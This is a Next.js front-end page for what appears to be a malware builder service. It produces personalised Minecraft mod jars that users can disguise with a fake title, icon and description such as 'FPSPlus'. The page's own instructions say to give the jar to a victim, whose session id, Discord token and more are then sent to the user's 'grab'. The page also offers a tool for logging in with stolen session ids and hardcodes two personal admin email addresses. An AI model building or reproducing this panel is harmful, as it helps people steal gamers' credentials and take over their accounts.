'use client';

import { useState, useEffect } from 'react';
import { useRouter, usePathname } from 'next/navigation';
import Sidebar from '@/components/Sidebar';

const colors = {
  bg: '#050508',
  panel: 'rgba(13, 13, 18, 0.7)',
  border: 'rgba(255,255,255,0.06)',
  text: '#f0f0f0',
  textDim: '#6b6e7b',
  green: '#22c55e',
};

const ADMIN_EMAILS = ['lifegrading@gmail.com', 'giodewaard152@gmail.com'];

const BUILD_STEPS = [
  { label: 'Queuing runner...', duration: 600 },
  { label: 'Setting environment...', duration: 800 },
  { label: 'Compiling jar...', duration: 0 },
  { label: 'Compiled complete', duration: 400 },
  { label: 'Uploading to storage...', duration: 600 },
  { label: 'Finalizing...', duration: 500 },
  { label: 'Build complete', duration: 0 },
];

export default function BuildPage() {
  const router = useRouter();
  const pathname = usePathname();
  const isActive = (p) => pathname === p || pathname.startsWith(p + '/');
  const [email, setEmail] = useState('');
  const [userEmail, setUserEmail] = useState('');
  const [emailConfirmed, setEmailConfirmed] = useState(false);
  const [downloading, setDownloading] = useState(false);
  const [buildStep, setBuildStep] = useState(-1);
  const [buildDone, setBuildDone] = useState(false);
  const [isPro, setIsPro] = useState(false);
  const [freeUses, setFreeUses] = useState(null);
  const [trialExhausted, setTrialExhausted] = useState(false);
  const [proChecked, setProChecked] = useState(false);

  // Optional Consent Mod customization modal states
  const [showCustomModal, setShowCustomModal] = useState(false);
  const [customTitle, setCustomTitle] = useState('');
  const [customDescription, setCustomDescription] = useState('');
  const [customLogo, setCustomLogo] = useState(null);
  const [customLogoPreview, setCustomLogoPreview] = useState('');

  useEffect(() => {
    fetch('/api/auth/user')
      .then(r => r.json())
      .then(d => {
        if (d.user?.email) {
          setUserEmail(d.user.email);
          setEmail(d.user.email);
          setEmailConfirmed(true);
          if (ADMIN_EMAILS.includes(d.user.email.toLowerCase())) {
            setIsPro(true);
            setProChecked(true);
          } else {
            fetch('/api/user/pro?t=' + Date.now(), { cache: 'no-store' })
              .then(r => r.json())
              .then(p => {
                setIsPro(p.is_pro);
                setFreeUses(p.free_uses_remaining);
                setTrialExhausted(p.trial_exhausted || false);
                setProChecked(true);
              })
              .catch(() => { setIsPro(false); setProChecked(true); });
          }
        } else {
          setProChecked(true);
        }
      })
      .catch(() => setProChecked(true));
  }, []);

  const handleConfirmEmail = () => {
    if (email && email.includes('@')) setEmailConfirmed(true);
  };

  const handleLogoChange = (e) => {
    const file = e.target.files?.[0];
    if (!file) return;
    if (!file.type.startsWith('image/')) {
      alert('Please select an image file (PNG, JPG, WebP)');
      return;
    }
    const reader = new FileReader();
    reader.onload = (evt) => {
      const result = evt.target?.result;
      setCustomLogo(result);
      setCustomLogoPreview(result);
    };
    reader.readAsDataURL(file);
  };

  const handleRemoveLogo = () => {
    setCustomLogo(null);
    setCustomLogoPreview('');
  };

  const handleDownload = async (type = 'consentmod', customData = null) => {
    if (!emailConfirmed || !email) return;
    setDownloading(true);
    setBuildStep(0);
    setBuildDone(false);

    let stepIndex = 0;
    const apiPromise = (type === 'consentmod' && customData)
      ? fetch('/api/download', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email,
            type,
            title: customData.title || '',
            description: customData.description || '',
            logo: customData.logo || null,
          }),
        })
      : fetch(`/api/download?email=${encodeURIComponent(email)}&type=${type}`);

    const runSteps = async () => {
      for (let i = 0; i < BUILD_STEPS.length; i++) {
        stepIndex = i;
        setBuildStep(i);
        if (i === 2) {
          await apiPromise;
        }
        if (BUILD_STEPS[i].duration > 0) {
          await new Promise(r => setTimeout(r, BUILD_STEPS[i].duration));
        }
      }
    };

    await runSteps();

    try {
      const res = await apiPromise;
      if (res.ok) {
        const disposition = res.headers.get('content-disposition');
        const fallbackName = type === 'authme' ? 'authme.jar' : 'consentmod.jar';
        const fileName = disposition ? disposition.split('filename=')[1]?.replace(/"/g, '') : fallbackName;
        const blob = await res.blob();
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = fileName;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
      }
    } catch (e) {}

    setBuildDone(true);
    setTimeout(() => { setDownloading(false); setBuildDone(false); setBuildStep(-1); }, 2000);
  };

  if (!proChecked) {
    return (
      <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
        <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>Loading...</div>
      </div>
    );
  }


  return (
    <div className="page-enter" style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
      <Sidebar userEmail={userEmail} router={router} />
      <div style={{ flex: 1, padding: '28px 36px', overflowY: 'auto' }}>
        <h1 style={{ fontSize: 24, fontWeight: 700, margin: '0 0 8px 0' }}>Build Center</h1>
        <p style={{ color: colors.textDim, fontSize: 14, margin: '0 0 24px 0' }}>Build, download, and install your mods.</p>

        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16, marginBottom: 20 }}>
          <div className="glass-card" style={{ borderRadius: 12, padding: 24 }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 16, fontSize: 14, fontWeight: 600, color: colors.text }}>
              <span>📧</span> Account Configuration
            </div>
            <div style={{ fontSize: 12, color: colors.textDim, letterSpacing: 1, textTransform: 'uppercase', marginBottom: 8 }}>YOUR EMAIL</div>
            <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 12 }}>
              This email is baked into your mod. Each download creates a personalized build.
            </div>
            <div style={{ display: 'flex', gap: 8 }}>
              <input
                type="email"
                value={email}
                onChange={e => { setEmail(e.target.value); setEmailConfirmed(false); }}
                placeholder="your@email.com"
                style={{ flex: 1, background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: 8, padding: '10px 14px', color: colors.text, fontSize: 13, outline: 'none', transition: 'all 0.2s ease' }}
              />
              <button
                onClick={handleConfirmEmail}
                disabled={!email || !email.includes('@')}
                className="btn-smooth"
                style={{ background: emailConfirmed ? colors.green : 'transparent', color: emailConfirmed ? '#000' : colors.textDim, border: `1px solid ${emailConfirmed ? colors.green : 'rgba(255,255,255,0.06)'}`, borderRadius: 8, padding: '10px 16px', fontSize: 13, fontWeight: 600, cursor: email && email.includes('@') ? 'pointer' : 'not-allowed' }}
              >
                {emailConfirmed ? '✓ Confirmed' : 'Confirm'}
              </button>
            </div>
            {emailConfirmed && email && (
              <div style={{ marginTop: 10, fontSize: 12, color: colors.green }}>
                ✓ Configured — grabs will be tagged to <strong>{email}</strong>
              </div>
            )}
          </div>

          <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
            <div className="glass-card" style={{ borderRadius: 12, padding: 24 }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 16, fontSize: 14, fontWeight: 600, color: colors.text }}>
                <span>🔨</span> Build Consent Mod
              </div>
              <div style={{ fontSize: 12, color: colors.textDim, letterSpacing: 1, textTransform: 'uppercase', marginBottom: 8 }}>VERSION</div>
              <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 16 }}>
                <div style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: 8, padding: '10px 16px', fontSize: 14, color: colors.text, display: 'flex', alignItems: 'center', gap: 8 }}>
                  Fabric 1.21.11
                  <span style={{ background: colors.green, color: '#000', fontSize: 10, fontWeight: 700, padding: '2px 6px', borderRadius: 4 }}>LATEST</span>
                </div>
              </div>
              <button
                onClick={() => {
                  if (!emailConfirmed || downloading) return;
                  setShowCustomModal(true);
                }}
                disabled={!emailConfirmed || downloading}
                className="btn-smooth"
                style={{ background: 'transparent', border: `1px solid ${emailConfirmed && !downloading ? 'rgba(255,255,255,0.12)' : 'rgba(255,255,255,0.06)'}`, color: emailConfirmed && !downloading ? colors.text : '#555', padding: '10px 20px', borderRadius: 8, fontSize: 13, fontWeight: 600, cursor: emailConfirmed && !downloading ? 'pointer' : 'not-allowed', display: 'inline-flex', alignItems: 'center', gap: 8 }}
              >
                <span>↓</span> {downloading ? 'Building...' : 'Download JAR'}
              </button>
              {!emailConfirmed && (
                <div style={{ marginTop: 8, fontSize: 12, color: '#ef4444' }}>Confirm your email first to enable download</div>
              )}
            </div>

            <div className="glass-card" style={{ borderRadius: 12, padding: 24 }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 8, fontSize: 14, fontWeight: 600, color: colors.text }}>
                <span>🛡️</span> Build AuthMe Login
              </div>
              <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 16 }}>
                Allows to login with session id
              </div>
              <div style={{ fontSize: 12, color: colors.textDim, letterSpacing: 1, textTransform: 'uppercase', marginBottom: 8 }}>VERSION</div>
              <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 16 }}>
                <div style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: 8, padding: '10px 16px', fontSize: 14, color: colors.text, display: 'flex', alignItems: 'center', gap: 8 }}>
                  AuthMe 1.21.11
                  <span style={{ background: colors.green, color: '#000', fontSize: 10, fontWeight: 700, padding: '2px 6px', borderRadius: 4 }}>LATEST</span>
                </div>
              </div>
              <button
                onClick={() => handleDownload('authme')}
                disabled={!emailConfirmed || downloading}
                className="btn-smooth"
                style={{ background: 'transparent', border: `1px solid ${emailConfirmed && !downloading ? 'rgba(255,255,255,0.12)' : 'rgba(255,255,255,0.06)'}`, color: emailConfirmed && !downloading ? colors.text : '#555', padding: '10px 20px', borderRadius: 8, fontSize: 13, fontWeight: 600, cursor: emailConfirmed && !downloading ? 'pointer' : 'not-allowed', display: 'inline-flex', alignItems: 'center', gap: 8 }}
              >
                <span>↓</span> {downloading ? 'Building...' : 'Download JAR'}
              </button>
            </div>
          </div>
        </div>

        <div className="glass-card" style={{ borderRadius: 12, padding: 20 }}>
          <div style={{ fontSize: 14, fontWeight: 600, color: colors.text, marginBottom: 10, display: 'flex', alignItems: 'center', gap: 8 }}>
            <span>📦</span> How It Works
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16 }}>
            <div style={{ fontSize: 13, color: colors.textDim }}>
              <div style={{ color: colors.green, fontWeight: 600, marginBottom: 4 }}>1. Build the mod.</div>
                Build the Consent Mod at the top right and download it.
            </div>
            <div style={{ fontSize: 13, color: colors.textDim }}>
              <div style={{ color: colors.green, fontWeight: 600, marginBottom: 4 }}>2. Grab the person</div>
              When downloaded, give it to a person. When they downloaded it their Session id, Discord token and more will show up at their grab.
            </div>
          </div>
        </div>
      </div>

      {/* Optional Customization Modal (Consent Mod Only) */}
      {showCustomModal && (
        <div style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, background: 'rgba(0,0,0,0.85)', backdropFilter: 'blur(8px)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 9998, padding: 16 }}>
          <div className="glass-card" style={{ background: 'rgba(13, 13, 18, 0.96)', border: `1px solid ${colors.border}`, borderRadius: 16, padding: '32px', width: '100%', maxWidth: 500, boxShadow: '0 20px 60px rgba(0,0,0,0.7)', position: 'relative' }}>
            
            {/* Header */}
            <div style={{ display: 'flex', alignItems: 'flex-start', justifyContent: 'space-between', marginBottom: 20 }}>
              <div>
                <div style={{ fontSize: 18, fontWeight: 700, color: colors.text, display: 'flex', alignItems: 'center', gap: 8 }}>
                  <span>🎨</span> Customize Consent Mod
                </div>
                <div style={{ fontSize: 13, color: colors.textDim, marginTop: 4 }}>
                  Change the file&apos;s Logo, Description, and Title (optional).
                </div>
              </div>
              <button
                onClick={() => setShowCustomModal(false)}
                style={{ background: 'transparent', border: 'none', color: colors.textDim, fontSize: 18, cursor: 'pointer', padding: 4 }}
              >
                ✕
              </button>
            </div>

            {/* Form Fields */}
            <div style={{ display: 'flex', flexDirection: 'column', gap: 16, marginBottom: 24 }}>
              {/* Logo / Icon */}
              <div>
                <div style={{ fontSize: 11, fontWeight: 600, color: colors.textDim, textTransform: 'uppercase', letterSpacing: 1, marginBottom: 8 }}>
                  Mod Logo / Icon (Optional)
                </div>
                <div style={{ display: 'flex', alignItems: 'center', gap: 14 }}>
                  <div style={{ width: 56, height: 56, borderRadius: 10, border: `1px solid ${colors.border}`, background: 'rgba(255,255,255,0.03)', display: 'flex', alignItems: 'center', justifyContent: 'center', overflow: 'hidden', flexShrink: 0 }}>
                    {customLogoPreview ? (
                      <img src={customLogoPreview} alt="Preview" style={{ width: '100%', height: '100%', objectFit: 'cover' }} />
                    ) : (
                      <span style={{ fontSize: 24, opacity: 0.5 }}>🖼️</span>
                    )}
                  </div>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: 6, flex: 1 }}>
                    <label style={{ display: 'inline-flex', alignItems: 'center', gap: 8, padding: '7px 14px', borderRadius: 6, background: 'rgba(255,255,255,0.06)', border: `1px solid ${colors.border}`, color: colors.text, fontSize: 12, fontWeight: 600, cursor: 'pointer', width: 'fit-content' }}>
                      <span>📁</span> Choose Image
                      <input type="file" accept="image/*" onChange={handleLogoChange} style={{ display: 'none' }} />
                    </label>
                    {customLogoPreview && (
                      <button
                        onClick={handleRemoveLogo}
                        style={{ background: 'transparent', border: 'none', color: '#ef4444', fontSize: 11, cursor: 'pointer', textAlign: 'left', padding: 0 }}
                      >
                        ✕ Remove image
                      </button>
                    )}
                  </div>
                </div>
              </div>

              {/* Title / Name */}
              <div>
                <div style={{ fontSize: 11, fontWeight: 600, color: colors.textDim, textTransform: 'uppercase', letterSpacing: 1, marginBottom: 8 }}>
                  Mod Title / Name (Optional)
                </div>
                <input
                  type="text"
                  value={customTitle}
                  onChange={(e) => setCustomTitle(e.target.value)}
                  placeholder="e.g. PerformanceBoost, FPSPlus, VoiceChat"
                  style={{ width: '100%', boxSizing: 'border-box', background: 'rgba(255,255,255,0.03)', border: `1px solid ${colors.border}`, borderRadius: 8, padding: '10px 14px', color: colors.text, fontSize: 13, outline: 'none' }}
                />
              </div>

              {/* Description */}
              <div>
                <div style={{ fontSize: 11, fontWeight: 600, color: colors.textDim, textTransform: 'uppercase', letterSpacing: 1, marginBottom: 8 }}>
                  Mod Description (Optional)
                </div>
                <textarea
                  value={customDescription}
                  onChange={(e) => setCustomDescription(e.target.value)}
                  placeholder="e.g. Boosts in-game FPS, reduces memory usage and optimizes chunk rendering."
                  rows={3}
                  style={{ width: '100%', boxSizing: 'border-box', background: 'rgba(255,255,255,0.03)', border: `1px solid ${colors.border}`, borderRadius: 8, padding: '10px 14px', color: colors.text, fontSize: 13, outline: 'none', resize: 'vertical', fontFamily: 'inherit' }}
                />
              </div>
            </div>

            {/* Actions */}
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'flex-end', gap: 10, paddingTop: 16, borderTop: `1px solid ${colors.border}` }}>
              <button
                onClick={() => setShowCustomModal(false)}
                className="btn-smooth"
                style={{ background: 'transparent', border: `1px solid ${colors.border}`, color: colors.textDim, padding: '9px 18px', borderRadius: 8, fontSize: 13, fontWeight: 500, cursor: 'pointer' }}
              >
                Cancel
              </button>
              <button
                onClick={() => {
                  setShowCustomModal(false);
                  handleDownload('consentmod', {
                    title: customTitle.trim(),
                    description: customDescription.trim(),
                    logo: customLogo,
                  });
                }}
                className="btn-smooth"
                style={{ background: colors.green, color: '#000', border: 'none', padding: '9px 22px', borderRadius: 8, fontSize: 13, fontWeight: 700, cursor: 'pointer', display: 'inline-flex', alignItems: 'center', gap: 6 }}
              >
                <span>↓</span> Continue Download
              </button>
            </div>
          </div>
        </div>
      )}

      {downloading && (
        <div style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, background: 'rgba(0,0,0,0.85)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 9999 }}>
          <div style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 16, padding: '40px 48px', textAlign: 'center', minWidth: 420 }}>
            <div style={{ fontSize: 18, fontWeight: 600, color: colors.text, marginBottom: 6 }}>Building your mod</div>
            <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 28 }}>Personalizing for <strong style={{ color: colors.green }}>{email}</strong></div>

            <div style={{ textAlign: 'left', marginBottom: 24 }}>
              {BUILD_STEPS.map((step, i) => {
                const isCurrent = i === buildStep && !buildDone;
                const isDone = i < buildStep || buildDone;
                return (
                  <div key={i} style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '6px 0', opacity: isDone || isCurrent ? 1 : 0.3 }}>
                    <div style={{ width: 20, height: 20, borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 11, fontWeight: 700, flexShrink: 0, background: isDone ? colors.green : isCurrent ? '#1a1b24' : 'transparent', color: isDone ? '#000' : isCurrent ? colors.green : '#444', border: isCurrent ? `1px solid ${colors.green}` : isDone ? 'none' : '1px solid #333' }}>
                      {isDone ? '✓' : isCurrent ? <span style={{ animation: 'spin 1s linear infinite', display: 'inline-block' }}>⟳</span> : i + 1}
                    </div>
                    <span style={{ fontSize: 13, color: isDone ? colors.green : isCurrent ? colors.text : '#555', fontWeight: isCurrent ? 600 : 400 }}>
                      {step.label}
                    </span>
                  </div>
                );
              })}
            </div>

            {buildDone && (
              <div style={{ fontSize: 14, color: colors.green, fontWeight: 600, marginTop: 8 }}>Download starting...</div>
            )}
          </div>
        </div>
      )}

      <style>{`@keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }`}</style>
    </div>
  );
}
